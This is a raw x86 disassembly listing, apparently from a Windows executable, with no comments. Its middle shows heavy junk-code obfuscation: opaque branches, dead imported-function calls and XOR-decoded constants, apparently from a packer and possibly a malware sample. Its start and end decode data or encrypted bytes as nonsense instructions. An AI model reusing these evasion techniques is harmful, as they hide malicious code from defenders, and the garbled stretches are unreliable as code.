  415940:	jmp    0x9f5b:0xac539c60
  415947:	adc    dl,BYTE PTR [esi-0x64872af6]
  41594d:	out    0x1e,eax
  41594f:	and    al,0x73
  415951:	test   BYTE PTR ds:0xb9d37a69,al
  415957:	dec    esp
  415958:	mov    ecx,0x2d9aacde
  41595d:	mov    esp,0x6d548d5f
  415962:	or     eax,0x255c85a3
  415967:	cs mov edx,0x1e1f6ef
  41596d:	out    0xf,eax
  41596f:	adc    eax,0x8ca5cf98
  415974:	pop    ebx
  415975:	jge    0x415927
  415977:	psubsw mm0,QWORD PTR [eax+0x40]
  41597b:	ja     0x415929
  41597d:	js     0x41593e
  41597f:	fcomp  st(7)
  415981:	cmp    cl,BYTE PTR [ecx+0x10]
  415984:	pop    edx
  415985:	jbe    0x415929
  415987:	xor    BYTE PTR [edi-0x38a91cb5],0xc3
  41598e:	xchg   ebp,eax
  41598f:	sbb    edi,DWORD PTR [ebx+0x2d23349c]
  415995:	aas    
  415996:	cmp    DWORD PTR [esi+ebx*1-0x7f0dd160],edi
  41599d:	imul   ebp,DWORD PTR [ecx],0x57bcfbbd
  4159a3:	push   ss
  4159a4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4159a5:	test   eax,0x683324bd
  4159aa:	push   edx
  4159ab:	call   0x26955b37
  4159b0:	pusha  
  4159b1:	sub    ebp,edx
  4159b3:	cmp    DWORD PTR [eax-0x49],0x91d5607f
  4159ba:	mov    dl,al
  4159bc:	cli    
  4159bd:	iret   
  4159be:	int3   
  4159bf:	and    eax,0x33e0458b
  4159c4:	ror    BYTE PTR [ebx-0x2fdc23bb],1
  4159ca:	mov    eax,DWORD PTR [ebp+0x10]
  4159cd:	xor    edx,0x7015
  4159d3:	sub    eax,edx
  4159d5:	mov    edx,DWORD PTR [ebp-0x28]
  4159d8:	mov    esi,DWORD PTR [ebp-0x2c]
  4159db:	and    edx,0x2a7b
  4159e1:	lea    edx,[edx+esi*1-0x3571]
  4159e8:	mov    esi,DWORD PTR [ebp-0x30]
  4159eb:	shr    edx,1
  4159ed:	or     edx,esi
  4159ef:	mov    esi,ecx
  4159f1:	sub    esi,edx
  4159f3:	add    esi,0x4751
  4159f9:	cmp    esi,eax
  4159fb:	jbe    0x4152ac
  415a01:	pop    esi
  415a02:	leave  
  415a03:	ret    0xc
  415a06:	push   ebp
  415a07:	mov    ebp,esp
  415a09:	sub    esp,0x7c
  415a0c:	xor    DWORD PTR ds:0x42826b,ebx
  415a12:	push   ebx
  415a13:	push   esi
  415a14:	push   edi
  415a15:	or     DWORD PTR ds:0x4283a7,0x412a
  415a1f:	mov    eax,DWORD PTR [ebp+0x8]
  415a22:	cmp    DWORD PTR ds:0x42823b,0x0
  415a29:	mov    ebx,0x3b8c
  415a2e:	mov    DWORD PTR ds:0x42819b,0x632c
  415a38:	jmp    0x415aab
  415a3d:	mov    edx,0x517f
  415a42:	mov    edi,DWORD PTR ds:0x4282ff
  415a48:	cmp    DWORD PTR ds:0x42823b,0x0
  415a4f:	jae    0x415a95
  415a55:	push   DWORD PTR [ebp-0x14]
  415a58:	push   DWORD PTR [ebp-0x1c]
  415a5b:	push   DWORD PTR [ebp-0x18]
  415a5e:	push   DWORD PTR [ebp-0x18]
  415a61:	push   0x4a1d
  415a66:	push   0x1f83
  415a6b:	push   DWORD PTR [ebp-0x14]
  415a6e:	call   DWORD PTR ds:0x428ef4
  415a74:	mov    edi,DWORD PTR ds:0x4281cf
  415a7a:	xor    ecx,ecx
  415a7c:	or     ecx,DWORD PTR ds:0x4281ef
  415a82:	sub    edi,ecx
  415a84:	imul   edi,DWORD PTR [edi+ecx*1]
  415a88:	movzx  edx,WORD PTR ds:0x428187
  415a8f:	and    DWORD PTR ds:0x4283b3,edx
  415a95:	xor    DWORD PTR ds:0x428253,0x17b
  415a9f:	sbb    DWORD PTR ds:0x428307,ecx
  415aa5:	adc    DWORD PTR ds:0x42817b,edi
  415aab:	mov    ecx,DWORD PTR [ebp+0xc]
  415aae:	shrd   eax,ecx,0x2
  415ab2:	shr    ecx,0x2
  415ab5:	mov    ecx,DWORD PTR [ebp+0x8]
  415ab8:	and    edi,0x5809
  415abe:	mov    edx,DWORD PTR [ebp+0xc]
  415ac1:	mov    edi,DWORD PTR ds:0x428183
  415ac7:	xor    DWORD PTR ds:0x4282af,edi
  415acd:	xor    edx,edx
  415acf:	xor    ebx,ebx
  415ad1:	xor    ebx,DWORD PTR ds:0x4281ff
  415ad7:	xor    edi,edi
  415ad9:	or     edi,DWORD PTR ds:0x4282bb
  415adf:	sub    ebx,edi
  415ae1:	or     ebx,DWORD PTR [ebx+edi*1]
  415ae4:	mov    esi,0x329e695d
  415ae9:	xor    eax,esi
  415aeb:	adc    ebx,0x4305
  415af1:	or     eax,edx
  415af3:	mov    DWORD PTR [ebp-0x28],eax
  415af6:	not    edx
  415af8:	mov    eax,DWORD PTR [ebp+0x8]
  415afb:	sbb    DWORD PTR ds:0x428393,edx
  415b01:	shl    ecx,0x1e
  415b04:	mov    ecx,DWORD PTR [ebp+0xc]
  415b07:	shrd   eax,ecx,0x2
  415b0b:	adc    ebx,0x5b1c
  415b11:	xor    eax,esi
  415b13:	shr    ecx,0x2
  415b16:	sbb    DWORD PTR ds:0x42825f,ecx
  415b1c:	mov    ecx,DWORD PTR [ebp+0x8]
  415b1f:	mov    edi,DWORD PTR ds:0x4281df
  415b25:	mov    edx,DWORD PTR ds:0x42822f
  415b2b:	sub    edx,edi
  415b2d:	and    edi,DWORD PTR [edi+edx*1]
  415b30:	mov    edx,DWORD PTR [ebp+0xc]
  415b33:	cmp    DWORD PTR ds:0x42839f,0x0
  415b3a:	not    DWORD PTR ds:0x428323
  415b40:	mov    DWORD PTR ds:0x42827b,0x4d0
  415b4a:	mov    DWORD PTR ds:0x428173,0x25d8
  415b54:	jmp    0x415ba8
  415b59:	mov    DWORD PTR ds:0x428383,0x25ca
  415b63:	cmp    DWORD PTR ds:0x42839f,0x0
  415b6a:	jge    0x415b90
  415b70:	push   DWORD PTR [ebp-0x28]
  415b73:	push   0x42816b
  415b78:	push   0x12d6
  415b7d:	call   DWORD PTR ds:0x428e8c
  415b83:	add    DWORD PTR ds:0x42837b,0x4989
  415b8d:	inc    edi
  415b8e:	add    edi,ebx
  415b90:	sbb    DWORD PTR ds:0x42832f,0x655f
  415b9a:	mov    ebx,DWORD PTR ds:0x4282fb
  415ba0:	adc    DWORD PTR ds:0x428337,ebx
  415ba6:	xor    edi,edi
  415ba8:	xor    edx,edx
  415baa:	add    ebx,edi
  415bac:	or     eax,edx
  415bae:	cmp    DWORD PTR ds:0x42818f,0x0
  415bb5:	mov    DWORD PTR ds:0x428187,0x74bf
  415bbf:	mov    DWORD PTR ds:0x428307,0x4195
  415bc9:	jmp    0x415c2e
  415bce:	mov    ebx,0x25c0
  415bd3:	mov    ebx,0x1763
  415bd8:	cmp    DWORD PTR ds:0x42818f,0x0
  415bdf:	jl     0x415c13
  415be5:	push   0x432b
  415bea:	push   0x428267
  415bef:	call   DWORD PTR ds:0x428e90
  415bf5:	sub    edi,DWORD PTR ds:0x4283b3
  415bfb:	sbb    DWORD PTR ds:0x428337,ecx
  415c01:	and    edx,DWORD PTR ds:0x4281a7
  415c07:	mov    edi,DWORD PTR ds:0x42824f
  415c0d:	and    DWORD PTR ds:0x42818b,edi
  415c13:	or     DWORD PTR ds:0x428183,0x73d6
  415c1d:	mov    edi,DWORD PTR ds:0x4281b3
  415c23:	mov    edx,DWORD PTR ds:0x42833b
  415c29:	sub    edi,edx
  415c2b:	xor    edi,DWORD PTR [edi+edx*1]
  415c2e:	mov    DWORD PTR [ebp-0x28],eax
  415c31:	cmp    DWORD PTR ds:0x42837f,0x0
  415c38:	mov    DWORD PTR ds:0x4283ab,ebx
  415c3e:	mov    DWORD PTR ds:0x42817f,ecx
  415c44:	jmp    0x415cab
  415c49:	mov    DWORD PTR ds:0x42819b,edx
  415c4f:	cmp    DWORD PTR ds:0x42837f,0x0
  415c56:	jbe    0x415ca1
  415c5c:	push   0x6725
  415c61:	push   0x42831b
  415c66:	push   0x8698
  415c6b:	push   0x6e02
  415c70:	push   0x538f
  415c75:	push   DWORD PTR [ebp-0x24]
  415c78:	push   0x8d72
  415c7d:	push   0x8325
  415c82:	call   DWORD PTR ds:0x428de0
  415c88:	mov    edi,DWORD PTR ds:0x4281d7
  415c8e:	mov    edx,DWORD PTR ds:0x42835f
  415c94:	sub    edi,edx
  415c96:	sub    edi,DWORD PTR [edi+edx*1]
  415c99:	add    DWORD PTR ds:0x428337,ebx
  415c9f:	or     edx,ebx
  415ca1:	add    edx,edi
  415ca3:	or     ebx,ebx
  415ca5:	and    ebx,DWORD PTR ds:0x42824f
  415cab:	mov    eax,ds:0x4223e8
  415cb0:	xor    edx,0x5bba
  415cb6:	mov    eax,DWORD PTR [eax]
  415cb8:	or     ebx,edx
  415cba:	mov    DWORD PTR [ebp-0xc],eax
  415cbd:	and    edi,0x77ac
  415cc3:	mov    eax,ds:0x422608
  415cc8:	mov    eax,DWORD PTR [eax]
  415cca:	cmp    DWORD PTR ds:0x42839b,0x0
  415cd1:	mov    edi,DWORD PTR ds:0x42828b
  415cd7:	mov    ebx,DWORD PTR ds:0x4283b3
  415cdd:	mov    DWORD PTR ds:0x428253,0x6f52
  415ce7:	jmp    0x415d31
  415cec:	mov    DWORD PTR ds:0x42838b,0x23d0
  415cf6:	cmp    DWORD PTR ds:0x42839b,0x0
  415cfd:	ja     0x415d21
  415d03:	push   DWORD PTR [ebp-0x18]
  415d06:	push   0x1c98
  415d0b:	push   DWORD PTR [ebp-0x1c]
  415d0e:	push   DWORD PTR [ebp-0xc]
  415d11:	call   DWORD PTR ds:0x428de4
  415d17:	or     ebx,edx
  415d19:	or     edx,edi
  415d1b:	adc    edi,0x39b9
  415d21:	and    edx,DWORD PTR ds:0x428277
  415d27:	sbb    edx,edi
  415d29:	add    edx,edi
  415d2b:	sbb    ebx,0x45bb
  415d31:	mov    DWORD PTR [ebp-0x10],eax
  415d34:	xor    DWORD PTR ds:0x42828f,0x428273
  415d3e:	mov    eax,DWORD PTR [ebp-0xc]
  415d41:	sbb    DWORD PTR ds:0x42831f,0x4085
  415d4b:	mov    eax,DWORD PTR [ebp-0xc]
  415d4e:	mov    ebx,DWORD PTR [ebp+0x8]
  415d51:	cmp    DWORD PTR ds:0x428337,0x0
  415d58:	mov    DWORD PTR ds:0x428293,0x5216
  415d62:	not    DWORD PTR ds:0x42826b
  415d68:	mov    edi,0x3d1c
  415d6d:	mov    DWORD PTR ds:0x42828b,0x4705
  415d77:	jmp    0x415dc1
  415d7c:	mov    DWORD PTR ds:0x4282ab,ebx
  415d82:	cmp    DWORD PTR ds:0x428337,0x0
  415d89:	jg     0x415da3
  415d8f:	push   0x4280cb
  415d94:	push   0x428079
  415d99:	call   DWORD PTR ds:0x428de8
  415d9f:	and    edx,edx
  415da1:	sub    edi,edi
  415da3:	xor    edx,edx
  415da5:	xor    edx,DWORD PTR ds:0x42828f
  415dab:	sbb    DWORD PTR ds:0x4283b3,edx
  415db1:	or     DWORD PTR ds:0x428393,ebx
  415db7:	sbb    DWORD PTR ds:0x4282b3,0x12ba
  415dc1:	shl    ecx,0x1e
  415dc4:	xor    ecx,ecx
  415dc6:	adc    DWORD PTR ds:0x42832f,ecx
  415dcc:	shld   ecx,eax,0x2
  415dd0:	shl    eax,0x2
  415dd3:	mov    edi,0xca79a575
  415dd8:	mov    edx,0x9c1b89e8
  415ddd:	or     DWORD PTR ds:0x42816f,0x4c83
  415de7:	mov    DWORD PTR [ebp-0x38],ebx
  415dea:	mov    ebx,DWORD PTR [ebp+0xc]
  415ded:	xor    DWORD PTR ds:0x428167,0x6279
  415df7:	xor    eax,edi
  415df9:	sub    DWORD PTR ds:0x4281ab,0x428173
  415e03:	xor    ecx,edx
  415e05:	mov    DWORD PTR ds:0x4281ab,0x1398
  415e0f:	mov    DWORD PTR [ebp-0x1c],0xa4069bae
  415e16:	mov    DWORD PTR ds:0x42837f,0x5e42
  415e20:	mov    DWORD PTR [ebp-0x18],0xa40692ae
  415e27:	mov    DWORD PTR [ebp-0x34],ebx
  415e2a:	mov    DWORD PTR ds:0x428287,0x218e
  415e34:	cmp    eax,DWORD PTR [ebp-0x38]
  415e37:	mov    DWORD PTR ds:0x4282b3,0x534
  415e41:	jne    0x415e59
  415e47:	mov    DWORD PTR ds:0x42825f,0x12af
  415e51:	cmp    ecx,ebx
  415e53:	je     0x416649
  415e59:	mov    eax,DWORD PTR [ebp-0x10]
  415e5c:	adc    DWORD PTR ds:0x42828f,edx
  415e62:	mov    eax,DWORD PTR [ebp-0x10]
  415e65:	xor    ecx,ecx
  415e67:	shld   ecx,eax,0x2
  415e6b:	and    DWORD PTR ds:0x428317,0x42819f
  415e75:	shl    eax,0x2
  415e78:	xor    ecx,edx
  415e7a:	cmp    DWORD PTR ds:0x428183,0x0
  415e81:	not    edx
  415e83:	mov    DWORD PTR ds:0x42832f,edx
  415e89:	mov    edx,0x6413
  415e8e:	jmp    0x415f0c
  415e93:	mov    DWORD PTR ds:0x42819f,0x1988
  415e9d:	mov    DWORD PTR ds:0x4282a7,0x1d2b
  415ea7:	cmp    DWORD PTR ds:0x428183,0x0
  415eae:	je     0x415ee8
  415eb4:	push   0x6b61
  415eb9:	push   0x4c93
  415ebe:	call   DWORD PTR ds:0x428dec
  415ec4:	or     DWORD PTR ds:0x428243,0x4f44
  415ece:	or     edx,0x2695
  415ed4:	sub    DWORD PTR ds:0x42837b,0x174
  415ede:	mov    DWORD PTR ds:0x42839f,0x41a3
  415ee8:	mov    edx,DWORD PTR ds:0x42839b
  415eee:	add    edx,DWORD PTR ds:0x42817f
  415ef4:	mov    DWORD PTR ds:0x42839b,edx
  415efa:	or     DWORD PTR ds:0x428387,ecx
  415f00:	mov    edx,DWORD PTR ds:0x428337
  415f06:	or     DWORD PTR ds:0x428297,edx
  415f0c:	mov    edx,DWORD PTR [ebp+0x8]
  415f0f:	xor    eax,edi
  415f11:	mov    DWORD PTR ds:0x4282a7,ecx
  415f17:	mov    edi,DWORD PTR [ebp+0xc]
  415f1a:	cmp    eax,edx
  415f1c:	jne    0x415f34
  415f22:	cmp    ecx,edi
  415f24:	mov    DWORD PTR ds:0x42832f,0x9a6
  415f2e:	je     0x416649
  415f34:	cmp    DWORD PTR ds:0x428163,0x0
  415f3b:	mov    DWORD PTR ds:0x428187,0x3be3
  415f45:	movzx  ebx,WORD PTR ds:0x428387
  415f4c:	not    edi
  415f4e:	jmp    0x415fba
  415f53:	mov    DWORD PTR ds:0x428327,ebx
  415f59:	cmp    DWORD PTR ds:0x428163,0x0
  415f60:	jne    0x415fad
  415f66:	push   0x3f61
  415f6b:	push   0x3f0f
  415f70:	push   DWORD PTR [ebp-0x18]
  415f73:	push   0x84fe
  415f78:	push   DWORD PTR [ebp-0x18]
  415f7b:	push   DWORD PTR [ebp-0x10]
  415f7e:	push   0x689e
  415f83:	push   DWORD PTR [ebp-0x18]
  415f86:	push   0x8af6
  415f8b:	call   DWORD PTR ds:0x428ef8
  415f91:	xor    DWORD PTR ds:0x4283b7,edx
  415f97:	sbb    edi,DWORD PTR ds:0x428293
  415f9d:	sub    DWORD PTR ds:0x42824f,0x4f5e
  415fa7:	sub    ecx,DWORD PTR ds:0x42838b
  415fad:	add    edi,0xe71
  415fb3:	dec    ecx
  415fb4:	and    ecx,DWORD PTR ds:0x428333
  415fba:	mov    eax,DWORD PTR [ebp-0x18]
  415fbd:	and    DWORD PTR ds:0x428383,ebx
  415fc3:	mov    ecx,DWORD PTR [ebp-0x18]
  415fc6:	push   0xfffffffe
  415fc8:	pop    ebx
  415fc9:	and    DWORD PTR ds:0x42819b,0xd25
  415fd3:	xor    ecx,ebx
  415fd5:	movzx  edi,BYTE PTR ds:0x42819b
  415fdc:	add    DWORD PTR ds:0x428283,edi
  415fe2:	shl    ecx,0x1e
  415fe5:	cmp    DWORD PTR ds:0x42824f,0x0
  415fec:	mov    DWORD PTR ds:0x4283a3,ecx
  415ff2:	mov    edi,0x37d1
  415ff7:	mov    DWORD PTR ds:0x4283b7,0x730b
  416001:	mov    edi,0x60e5
  416006:	jmp    0x416062
  41600b:	mov    DWORD PTR ds:0x428383,0x1cd3
  416015:	mov    DWORD PTR ds:0x42817f,0x4bc0
  41601f:	cmp    DWORD PTR ds:0x42824f,0x0
  416026:	jg     0x41603f
  41602c:	push   0x1ec5
  416031:	call   DWORD PTR ds:0x428efc
  416037:	add    DWORD PTR ds:0x428183,edx
  41603d:	neg    edi
  41603f:	mov    DWORD PTR ds:0x428327,0x2c32
  416049:	and    edi,DWORD PTR ds:0x42825f
  41604f:	and    edi,0x1973
  416055:	movzx  edi,WORD PTR ds:0x428257
  41605c:	adc    DWORD PTR ds:0x42827b,edi
  416062:	mov    edi,0xa4069aaf
  416067:	and    DWORD PTR ds:0x4283ab,0x1058
  416071:	xor    eax,edi
  416073:	sub    DWORD PTR ds:0x428317,0x42828f
  41607d:	shr    eax,0x2
  416080:	or     eax,ecx
  416082:	cmp    DWORD PTR ds:0x42819f,0x0
  416089:	mov    DWORD PTR ds:0x428337,0x1e83
  416093:	mov    DWORD PTR ds:0x428393,edx
  416099:	movzx  ecx,WORD PTR ds:0x42826b
  4160a0:	jmp    0x4160ed
  4160a5:	not    ecx
  4160a7:	mov    ecx,DWORD PTR ds:0x4281a3
  4160ad:	cmp    DWORD PTR ds:0x42819f,0x0
  4160b4:	jg     0x4160e2
  4160ba:	push   DWORD PTR [ebp-0x20]
  4160bd:	push   DWORD PTR [ebp-0x18]
  4160c0:	call   DWORD PTR ds:0x428df0
  4160c6:	adc    DWORD PTR ds:0x42832b,edi
  4160cc:	or     DWORD PTR ds:0x42826b,0x4a59
  4160d6:	mov    ecx,DWORD PTR ds:0x42823f
  4160dc:	sub    DWORD PTR ds:0x42819b,ecx
  4160e2:	add    DWORD PTR ds:0x42828f,0x16e5
  4160ec:	dec    ecx
  4160ed:	mov    DWORD PTR [ebp-0x34],eax
  4160f0:	mov    eax,ds:0x422568
  4160f5:	and    ecx,DWORD PTR ds:0x42827f
  4160fb:	mov    DWORD PTR [ebp-0x34],eax
  4160fe:	mov    eax,DWORD PTR [ebp-0xc]
  416101:	mov    DWORD PTR [ebp-0x14],eax
  416104:	xor    DWORD PTR ds:0x42838b,ecx
  41610a:	mov    ecx,DWORD PTR [ebp-0x14]
  41610d:	or     DWORD PTR ds:0x4283a3,0x5817
  416117:	push   0x4
  416119:	cmp    DWORD PTR ds:0x42819b,0x0
  416120:	mov    DWORD PTR ds:0x428383,0x7b16
  41612a:	mov    DWORD PTR ds:0x42819f,0x195b
  416134:	jmp    0x41618b
  416139:	mov    DWORD PTR ds:0x42827b,0x5f2a
  416143:	cmp    DWORD PTR ds:0x42819b,0x0
  41614a:	jle    0x41616d
  416150:	push   DWORD PTR [ebp-0x20]
  416153:	call   DWORD PTR ds:0x428f00
  416159:	xor    DWORD PTR ds:0x428177,0x42816b
  416163:	sub    DWORD PTR ds:0x428163,0x42818f
  41616d:	sbb    DWORD PTR ds:0x42829f,0x428297
  416177:	and    DWORD PTR ds:0x42828f,0x56d1
  416181:	xor    DWORD PTR ds:0x42827b,0x1431
  41618b:	pop    eax
  41618c:	or     DWORD PTR ds:0x42826f,0x4281ab
  416196:	sub    eax,ecx
  416198:	mov    ecx,DWORD PTR [ebp-0x10]
  41619b:	add    ecx,eax
  41619d:	mov    DWORD PTR [ebp-0x24],ecx
  4161a0:	mov    ecx,DWORD PTR ds:0x42821f
  4161a6:	mov    ecx,DWORD PTR [ecx]
  4161a8:	sbb    DWORD PTR ds:0x4281a3,ecx
  4161ae:	lea    eax,[ebp-0x30]
  4161b1:	mov    DWORD PTR [ebp-0x2c],eax
  4161b4:	and    eax,0x1e1b
  4161b9:	mov    eax,DWORD PTR [ebp-0x1c]
  4161bc:	mov    ecx,DWORD PTR [ebp-0x1c]
  4161bf:	xor    eax,edi
  4161c1:	xor    ecx,ebx
  4161c3:	sub    DWORD PTR ds:0x42819b,0x428277
  4161cd:	shr    eax,0x2
  4161d0:	and    DWORD PTR ds:0x42829b,0x42825b
  4161da:	shl    ecx,0x1e
  4161dd:	sbb    DWORD PTR ds:0x428327,0x42823b
  4161e7:	or     eax,ecx
  4161e9:	or     DWORD PTR ds:0x428293,0x697f
  4161f3:	mov    DWORD PTR [ebp-0x20],eax
  4161f6:	mov    DWORD PTR [ebp-0x8],0xa4069abe
  4161fd:	mov    eax,DWORD PTR [ebp-0x8]
  416200:	mov    ecx,DWORD PTR [ebp-0x8]
  416203:	xor    eax,edi
  416205:	xor    ecx,ebx
  416207:	shr    eax,0x2
  41620a:	shl    ecx,0x1e
  41620d:	or     ecx,eax
  41620f:	push   ecx
  416210:	lea    eax,[ebp-0x8]
  416213:	push   eax
  416214:	lea    eax,[ebp-0x7c]
  416217:	push   eax
  416218:	call   0x415231
  41621d:	mov    eax,DWORD PTR [ebp-0x8]
  416220:	mov    ecx,DWORD PTR [ebp-0x8]
  416223:	xor    eax,edi
  416225:	xor    ecx,ebx
  416227:	shr    eax,0x2
  41622a:	shl    ecx,0x1e
  41622d:	or     ecx,eax
  41622f:	push   ecx
  416230:	lea    eax,[ebp-0x14]
  416233:	push   eax
  416234:	mov    eax,DWORD PTR [ebp+0x8]
  416237:	mov    ecx,DWORD PTR [ebp+0xc]
  41623a:	shrd   eax,ecx,0x2
  41623e:	shr    ecx,0x2
  416241:	mov    ecx,DWORD PTR [ebp+0x8]
  416244:	mov    edx,DWORD PTR [ebp+0xc]
  416247:	xor    eax,esi
  416249:	xor    edx,edx
  41624b:	or     eax,edx
  41624d:	lea    eax,[ebp+eax*4-0x78]
  416251:	push   eax
  416252:	shl    ecx,0x1e
  416255:	call   0x415231
  41625a:	mov    eax,DWORD PTR [ebp-0x8]
  41625d:	mov    ecx,DWORD PTR [ebp-0x8]
  416260:	xor    eax,edi
  416262:	xor    ecx,ebx
  416264:	shr    eax,0x2
  416267:	shl    ecx,0x1e
  41626a:	or     ecx,eax
  41626c:	push   ecx
  41626d:	lea    eax,[ebp-0x24]
  416270:	push   eax
  416271:	mov    eax,DWORD PTR [ebp+0x10]
  416274:	mov    ecx,DWORD PTR [ebp+0x14]
  416277:	shrd   eax,ecx,0x2
  41627b:	shr    ecx,0x2
  41627e:	mov    ecx,DWORD PTR [ebp+0x10]
  416281:	mov    edx,DWORD PTR [ebp+0x14]
  416284:	xor    eax,esi
  416286:	xor    edx,edx
  416288:	or     eax,edx
  41628a:	lea    eax,[ebp+eax*4-0x78]
  41628e:	push   eax
  41628f:	shl    ecx,0x1e
  416292:	call   0x415231
  416297:	mov    eax,DWORD PTR [ebp-0x8]
  41629a:	mov    ecx,DWORD PTR [ebp-0x8]
  41629d:	xor    ecx,ebx
  41629f:	xor    eax,edi
  4162a1:	shl    ecx,0x1e
  4162a4:	shr    eax,0x2
  4162a7:	or     ecx,eax
  4162a9:	push   ecx
  4162aa:	lea    eax,[ebp-0x20]
  4162ad:	push   eax
  4162ae:	mov    eax,DWORD PTR [ebp+0x10]
  4162b1:	mov    ecx,DWORD PTR [ebp+0x14]
  4162b4:	shrd   eax,ecx,0x2
  4162b8:	shr    ecx,0x2
  4162bb:	mov    ecx,DWORD PTR [ebp+0x10]
  4162be:	mov    edx,DWORD PTR [ebp+0x14]
  4162c1:	xor    edx,edx
  4162c3:	xor    eax,esi
  4162c5:	or     eax,edx
  4162c7:	shl    ecx,0x1e
  4162ca:	mov    ecx,DWORD PTR [ebp+0x10]
  4162cd:	mov    edx,DWORD PTR [ebp+0x14]
  4162d0:	shrd   ecx,edx,0x2
  4162d4:	shr    edx,0x2
  4162d7:	mov    edx,DWORD PTR [ebp+0x10]
  4162da:	mov    ebx,DWORD PTR [ebp+0x14]
  4162dd:	xor    ecx,esi
  4162df:	xor    ebx,ebx
  4162e1:	or     ecx,ebx
  4162e3:	add    eax,ecx
  4162e5:	lea    eax,[ebp+eax*4-0x78]
  4162e9:	push   eax
  4162ea:	shl    edx,0x1e
  4162ed:	call   0x415231
  4162f2:	mov    eax,DWORD PTR [ebp-0x8]
  4162f5:	mov    ecx,DWORD PTR [ebp-0x8]
  4162f8:	xor    ecx,0xfffffffe
  4162fb:	shl    ecx,0x1e
  4162fe:	jmp    0x41655e
  416303:	sbb    eax,0x26add60b
  416308:	lods   eax,DWORD PTR ds:[esi]
  416309:	sbb    bh,BYTE PTR [edx-0x45]
  41630c:	xor    bl,BYTE PTR [ebx+0x70]
  41630f:	add    eax,0xf4b0af3f
  416314:	add    BYTE PTR [esi],dl
  416316:	sbb    BYTE PTR [ebx+0x11181814],bl
  41631c:	leave  
  41631d:	jb     0x416350
  41631f:	xchg   esp,eax
  416320:	jg     0x41631e
  416322:	add    ecx,DWORD PTR [edx-0x33]
  416325:	push   edx
  416326:	xchg   ebp,eax
  416327:	and    bh,BYTE PTR [esi+ecx*1+0x13082822]
  41632e:	add    DWORD PTR [ebp-0x5a],edx
  416331:	sub    al,0x28
  416333:	cld    
  416334:	bnd ret 
  416336:	mov    fs,WORD PTR [ecx]
  416338:	enter  0xbb2e,0xd9
  41633c:	loopne 0x41634f
  41633e:	daa    
  41633f:	or     DWORD PTR [ebp+eax*4+0x6],edx
  416343:	adc    ebp,DWORD PTR [esi+0x1c]
  416346:	pop    esp
  416347:	out    dx,al
  416348:	dec    ebp
  416349:	pop    ss
  41634a:	(bad)  
  41634b:	leave  
  41634c:	ror    BYTE PTR fs:[eax+edx*4+0x2a],0x81
  416352:	aad    0xdb
  416354:	(bad)  
  416355:	lahf   
  416356:	mov    dh,0x7e
  416358:	inc    eax
  416359:	out    0x92,al
  41635b:	adc    bl,BYTE PTR [edx-0x45]
  41635e:	xchg   ebp,eax
  41635f:	mov    eax,ds:0x982254f6
  416364:	or     BYTE PTR [ebx-0x6e],al
  416367:	fwait
  416368:	xchg   ebp,eax
  416369:	sub    DWORD PTR [edx],0x1364f97d
  41636f:	cmp    eax,0x34d66f11
  416374:	inc    edx
  416375:	enter  0xbb04,0x94
  416379:	sahf   
  41637a:	sbb    dl,ch
  41637c:	cld    
  41637d:	shl    DWORD PTR [ebx-0x7e28ba40],0x9e
  416384:	xlat   BYTE PTR ds:[ebx]
  416385:	sbb    al,cl
  416387:	dec    edx
  416388:	push   0x52bcb394
  41638d:	cld    
  41638e:	lds    edx,FWORD PTR [ebx+0x27]
  416391:	arpl   WORD PTR [esi-0x45a52150],cx
  416397:	push   ebx
  416398:	mov    eax,esi
  41639a:	pusha  
  41639b:	sar    BYTE PTR [ebx],cl
  41639d:	and    al,0x54
  41639f:	(bad)  
  4163a0:	mov    eax,ds:0xc94d1608
  4163a5:	test   DWORD PTR [esi+eax*8+0x5934f793],esp
  4163ac:	inc    ecx
  4163ad:	(bad)  
  4163ae:	daa    
  4163af:	addr16 mov esi,esi
  4163b2:	repz (bad) 
  4163b4:	pusha  
  4163b5:	gs jnp 0x41641d
  4163b8:	jmp    0x41636b
  4163ba:	enter  0x4d80,0xd5
  4163be:	stos   DWORD PTR es:[edi],eax
  4163bf:	aaa    
  4163c0:	add    eax,0x511cbb0
  4163c5:	pop    edi
  4163c6:	stos   DWORD PTR es:[edi],eax
  4163c7:	mov    cl,0x11
  4163c9:	popf   
  4163ca:	int    0xcf
  4163cc:	jb     0x4163a5
  4163ce:	and    al,BYTE PTR [ebp+0x36ad117b]
  4163d4:	and    ch,ch
  4163d6:	lds    ebx,FWORD PTR [eax]
  4163d8:	call   0xb471508e
  4163dd:	inc    esp
  4163de:	sub    bh,BYTE PTR [esi-0x52]
  4163e1:	fs push es
  4163e3:	rcl    esp,0x38
  4163e6:	xor    dh,bl
  4163e8:	retf   0x8a71
  4163eb:	lods   eax,DWORD PTR ds:[esi]
  4163ec:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4163ed:	stc    
  4163ee:	cmp    ecx,DWORD PTR [ecx]
  4163f0:	(bad)  
  4163f1:	and    DWORD PTR [edx+0x7f],ecx
  4163f4:	cmp    al,0xa1
  4163f6:	fwait
  4163f7:	aas    
  4163f8:	xchg   ebp,eax
  4163f9:	mov    cl,dl
  4163fb:	jmp    0x4163c0
  4163fd:	(bad)  
  4163fe:	jno    0x41645c
  416400:	das    
  416401:	into   
  416402:	pop    edx
  416403:	daa    
  416404:	ja     0x41643f
  416406:	pop    edi
  416407:	sbb    BYTE PTR [edi],al
  416409:	ret    0x63a2
  41640c:	enter  0x743b,0x12
  416410:	jbe    0x416432
  416412:	pop    ebx
  416413:	lea    eax,[edx-0x4e41e448]
  416419:	je     0x416428
  41641b:	jmp    0xdb1c204a
  416420:	ins    DWORD PTR es:[edi],dx
  416421:	stc    
  416422:	(bad)  
  416423:	test   eax,0x5491110
  416428:	xor    ch,ah
  41642a:	mov    eax,ds:0x804b232e
  41642f:	pusha  
  416430:	inc    esp
  416431:	push   edx
  416432:	ret    
  416433:	pop    ss
  416434:	dec    ebp
  416435:	fcom   QWORD PTR [ecx-0xca4860]
  41643b:	repz out 0x1c,al
  41643e:	or     al,0xec
  416440:	jne    0x41644b
  416442:	xchg   edx,eax
  416443:	add    al,0x8e
  416445:	jae    0x416464
  416447:	loop   0x41647b
  416449:	scas   al,BYTE PTR es:[edi]
  41644a:	fsub   st,st(7)
  41644c:	es xor eax,0xa7ee915f
  416452:	xchg   edi,eax
  416453:	add    al,0x5e
  416455:	push   edx
  416456:	mov    al,0x79
  416458:	ins    BYTE PTR es:[edi],dx
  416459:	sbb    BYTE PTR [eax-0x1b7a532c],ch
  41645f:	pop    esp
  416460:	dec    eax
  416461:	cmp    eax,ebp
  416463:	jecxz  0x416431
  416465:	push   ebp
  416466:	(bad)  
